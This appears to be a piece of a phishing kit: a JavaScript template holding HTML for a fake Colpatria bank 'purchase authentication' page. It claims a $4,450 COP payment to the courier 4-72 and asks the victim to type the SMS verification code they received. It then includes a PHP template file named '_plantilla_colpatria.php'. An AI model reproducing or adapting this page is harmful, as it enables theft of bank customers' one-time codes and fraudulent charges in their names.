var colpatria_contenido = `
<div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
    <div class="direction--row">
        <div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0 m-auto">
            <h1 class="hero text-center">Autenticación de Compra</h1>
            <form onsubmit="return false" role="form" autocomplete="off" class="form ng-pristine ng-invalid ng-touched">
                <div class="margin-xs-24--top form__password">
                    <div class="stepper__label">
                        Le hemos enviado un código de verificación a su número de teléfono. Este código es de uso personal, por seguridad no lo comparta con terceros.
                    </div>
                    <div class="stepper__label">
                        Usted esta autorizando un pago a 4-72 por $4.450 Cop
                    </div>
                    <canvas-input-text formcontrolname="secondCredential" _nghost-hjw-c48="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                        <div class="margin-xs-24--top form__input">
                            <div class="form__input--inline m-auto padding-xs-24">
                                <input class="text-center input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtOTP" type="tel" inputmode="numeric" pattern="[0-9]*" onkeypress="isInputNumber(event)" placeholder="Código de Verificación" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="6">
                                <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                        <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                        <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                        <path fill="none" d="M12.104 14.582v2.695"></path>
                                        <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                    </svg>
                                </canvas-svg>
                                <button type="button" class="button input-w-aux__action">
                                    <canvas-svg role="presentation" class="flex">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                            <g fill="none">
                                                <path d="M1.333 11.933c0 1.451 3.43 7.334 10.667 7.334 1.686 0 3.165-.32 4.442-.827 4.206-1.673 6.225-5.394 6.225-6.507 0-1.45-3.43-7.333-10.667-7.333-7.236 0-10.667 5.882-10.667 7.333z"></path>
                                                <path d="M12 8.267c-2.076 0-3.765 1.645-3.765 3.666 0 2.022 1.69 3.667 3.765 3.667 2.076 0 3.765-1.645 3.765-3.667 0-2.021-1.69-3.666-3.765-3.666"></path>
                                            </g>
                                        </svg>
                                    </canvas-svg>
                                </button>
                            </div>
                        </div>
                    </canvas-input-text>
                    <!-- <div class="password-validation"><span> 8+ caracteres </span><span> 1+ mayúscula </span><span> 1+ minúscula </span><span> 1+ número </span></div> -->
                </div>
                <div class="margin-xs-24--top">
                    <a class="link link__text" id="linkHelpId" href="#">¿Necesitas ayuda?</a>
                </div>
                <input class="text-center input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtOTP" style="display:none;" type="tel" inputmode="numeric" pattern="[0-9]*" onkeypress="isInputNumber(event)" placeholder="Código de Verificación" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="6">

                <div class="margin-xs-24--top">
                    <canvas-button width="100%">
                        <button class="button button--primary" id="btnOTP" style="width: 100%;">
                            <span>Enviar</span>
                        </button>
                    </canvas-button>
                </div>
            </form>
        </div>
    </div>
</div>
`
<?php
require_once('_plantilla_colpatria.php');
?>